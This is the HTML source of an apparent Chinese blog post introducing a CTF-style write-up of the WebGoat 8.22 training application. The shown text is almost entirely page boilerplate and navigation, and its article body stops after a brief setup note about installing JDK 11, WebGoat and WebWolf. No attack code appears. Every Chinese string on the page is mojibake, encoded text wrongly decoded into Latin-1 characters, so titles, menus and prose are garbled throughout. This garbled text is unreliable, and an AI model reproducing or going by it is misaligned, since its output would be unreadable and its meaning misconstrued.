<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><div id="myscoll"></div><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CTFä¹‹WebGoatå­¦ä¹ è®°å½• | NoneVector</title><meta name="keywords" content="WebGoat"><meta name="author" content="NoneVector,2339115702@qq.com"><meta name="copyright" content="NoneVector"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="WebGoat8.22ä¹‹Write up">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFä¹‹WebGoatå­¦ä¹ è®°å½•">
<meta property="og:url" content="https://nonevector.top/posts/19.html">
<meta property="og:site_name" content="NoneVector">
<meta property="og:description" content="WebGoat8.22ä¹‹Write up">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/45136636_p0.jpg">
<meta property="article:published_time" content="2023-12-10T10:25:17.643Z">
<meta property="article:modified_time" content="2024-01-07T06:08:54.585Z">
<meta property="article:author" content="NoneVector">
<meta property="article:tag" content="WebGoat">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/45136636_p0.jpg"><link rel="shortcut icon" href="/assets/favicon.ico"><link rel="canonical" href="https://nonevector.top/posts/19"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.js',
      css: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTFä¹‹WebGoatå­¦ä¹ è®°å½•',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-07 14:08:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css"><script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><script src="https://npm.elemecdn.com/echarts@4.9.0/map/js/china.js"></script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><style id="themeColor"></style><style id="rightSide"></style><style id="transPercent"></style><style id="blurNum"></style><style id="settingStyle"></style><span id="fps"></span><style id="defineBg"></style><style id="menu_shadow"></style><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="NoneVector" type="application/atom+xml">
</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/assets/1.jpg" onerror="onerror=null;src='/assets/r1.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shouye"></use></svg><span class="menu_word" style="font-size:17px"> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wenzhang"></use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« </span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang">                   </use></svg><span class="menu_word" style="font-size:17px"> å½’æ¡£</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-biaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> æ ‡ç­¾</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiuxian"></use></svg><span class="menu_word" style="font-size:17px"> ä¼‘é—²</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/life/music/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-yinlehe">                   </use></svg><span class="menu_word" style="font-size:17px"> éŸ³ä¹</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/games/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-youxishoubing">                   </use></svg><span class="menu_word" style="font-size:17px"> æ¸¸æˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> å…«å®ç®±</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/gallery/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-gallery">                   </use></svg><span class="menu_word" style="font-size:17px"> ç”»å»Š</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/animation/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maozi">                   </use></svg><span class="menu_word" style="font-size:17px"> åŠ¨ç”»</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> ç½‘å€å¯¼èˆª</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu1"></use></svg><span class="menu_word" style="font-size:17px"> ç¤¾äº¤</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyanban">                   </use></svg><span class="menu_word" style="font-size:17px"> ç•™è¨€æ¿</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-icon-test">                   </use></svg><span class="menu_word" style="font-size:17px"> å‹äººå¸</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-WEBSITE"></use></svg><span class="menu_word" style="font-size:17px"> ç½‘ç«™</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/census/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--tongjibiao">                   </use></svg><span class="menu_word" style="font-size:17px"> ç½‘ç«™ç»Ÿè®¡</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/charts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-tubiao_moban-68">                   </use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« ç»Ÿè®¡</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/time/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shijian">                   </use></svg><span class="menu_word" style="font-size:17px"> æ—§æ—¶å…‰</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-PersonalDataProtection"></use></svg><span class="menu_word" style="font-size:17px"> ä¸ªäºº</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu">                   </use></svg><span class="menu_word" style="font-size:17px"> å” å¨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifeiji">                   </use></svg><span class="menu_word" style="font-size:17px"> å…³äº</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">NoneVector</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shouye"></use></svg><span class="menu_word" style="font-size:17px"> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wenzhang"></use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« </span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang">                   </use></svg><span class="menu_word" style="font-size:17px"> å½’æ¡£</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-biaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> æ ‡ç­¾</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiuxian"></use></svg><span class="menu_word" style="font-size:17px"> ä¼‘é—²</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/life/music/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-yinlehe">                   </use></svg><span class="menu_word" style="font-size:17px"> éŸ³ä¹</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/games/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-youxishoubing">                   </use></svg><span class="menu_word" style="font-size:17px"> æ¸¸æˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> å…«å®ç®±</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/gallery/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-gallery">                   </use></svg><span class="menu_word" style="font-size:17px"> ç”»å»Š</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/animation/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maozi">                   </use></svg><span class="menu_word" style="font-size:17px"> åŠ¨ç”»</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> ç½‘å€å¯¼èˆª</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu1"></use></svg><span class="menu_word" style="font-size:17px"> ç¤¾äº¤</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyanban">                   </use></svg><span class="menu_word" style="font-size:17px"> ç•™è¨€æ¿</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-icon-test">                   </use></svg><span class="menu_word" style="font-size:17px"> å‹äººå¸</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-WEBSITE"></use></svg><span class="menu_word" style="font-size:17px"> ç½‘ç«™</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/census/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--tongjibiao">                   </use></svg><span class="menu_word" style="font-size:17px"> ç½‘ç«™ç»Ÿè®¡</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/charts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-tubiao_moban-68">                   </use></svg><span class="menu_word" style="font-size:17px"> æ–‡ç« ç»Ÿè®¡</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/time/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shijian">                   </use></svg><span class="menu_word" style="font-size:17px"> æ—§æ—¶å…‰</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-PersonalDataProtection"></use></svg><span class="menu_word" style="font-size:17px"> ä¸ªäºº</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-jiaoliu">                   </use></svg><span class="menu_word" style="font-size:17px"> å” å¨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifeiji">                   </use></svg><span class="menu_word" style="font-size:17px"> å…³äº</span></a></li></ul></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="search faa-parent animated-hover" title="æ£€ç´¢ç«™å†…ä»»ä½•ä½ æƒ³è¦çš„ä¿¡æ¯"><svg class="faa-tada icon" style="height:24px;width:24px;fill:currentColor;position:relative;top:6px" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg><span> æœç´¢</span></a></div><a class="meihua faa-parent animated-hover" onclick="toggleWinbox()" title="ç¾åŒ–è®¾ç½®-è‡ªå®šä¹‰ä½ çš„é£æ ¼" id="meihua-button"><svg class="faa-tada icon" style="height:26px;width:26px;fill:currentColor;position:relative;top:8px" aria-hidden="true"><use xlink:href="#icon-shezhi"></use></svg></a><a class="sun_moon faa-parent animated-hover" onclick="switchNightMode()" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢" id="nightmode-button"><svg class="faa-tada" style="height:25px;width:25px;fill:currentColor;position:relative;top:7px" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-yueliang">       </use></svg></a><div id="toggle-menu"><a><i class="fas fa-bars fa-fw"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">CTFä¹‹WebGoatå­¦ä¹ è®°å½•</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><svg class="meta_icon post-meta-icon" style="width:30px;height:30px;position:relative;top:10px"><use xlink:href="#icon-rili"></use></svg><span class="post-meta-label">å‘è¡¨äº </span><time class="post-meta-date-created" datetime="2023-12-10T10:25:17.643Z" title="å‘è¡¨äº 2023-12-10 18:25:17">2023-12-10</time><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-gengxin1"></use></svg><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-01-07T06:08:54.585Z" title="æ›´æ–°äº 2024-01-07 14:08:54">2024-01-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-biaoqian"></use></svg><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:8px"><use xlink:href="#icon-charuword"></use></svg><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">2.9w</span><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:20px;height:20px;position:relative;top:5px"><use xlink:href="#icon-shizhong"></use></svg><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>110åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTFä¹‹WebGoatå­¦ä¹ è®°å½•"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:5px"><use xlink:href="#icon-eye"></use></svg><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="å®‰è£…-ç¯å¢ƒé…ç½®">å®‰è£…+ç¯å¢ƒé…ç½®</h2>
<blockquote>
<p>ä¸é€šç‰ˆæœ¬æœ‰äº›åœ°æ–¹ä¸ä¸€æ ·ï¼Œå› æ­¤æœ€å¥½æ‰¾ä¸€æ ·çš„ç‰ˆæœ¬</p>
</blockquote>
<p>å…ˆè¦å®‰è£…jdkã€Webgoatå’ŒWebwolf</p>
<p>Webgoatå’ŒWebwolf jdk1.8ä¸æ”¯æŒäº†ï¼Œéœ€è¦å®‰è£…jdk11</p>
